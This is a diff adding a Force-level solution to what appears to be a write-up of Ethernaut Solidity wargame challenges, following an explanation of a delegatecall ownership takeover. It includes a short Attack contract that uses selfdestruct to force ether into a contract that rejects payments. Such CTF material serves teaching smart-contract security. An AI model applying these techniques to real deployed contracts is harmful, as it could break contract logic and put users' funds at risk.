@@ -177,3 +177,31 @@ This tells Solidity to call the function `pwn()` inside `Delegate`.
 The function `pwn()` updates the owner to `msg.sender`.
 Delegatecall runs the code of `Delegate` using the context of `Delegation`.
 Therefore `Delegation`'s storage was updated to `msg.sender` where `msg.sender` is the caller of `Delegation`, in this case Attack.
+
+
+# 7. [Challenge 7: Force](https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea)
+
+Tasks:
+- Some contracts will simply not take your money ¯\_(ツ)_/¯
+- The goal of this level is to make the balance of the contract greater than zero.
+
+**Solution:** \
+Vulnerable Code:
+Attack Payload:
+```
+contract Attack {
+    Force force;
+
+    constructor(Force _force) public {
+        force = Force(_force);
+    }
+
+    function attack() public payable {
+        address payable addr = payable(address(force));
+        selfdestruct(addr);
+    }
+}
+```
+To solve the challenge we can simply use `selfdestruct` in our contract and than it will send all the ether to our desire address.
+
+
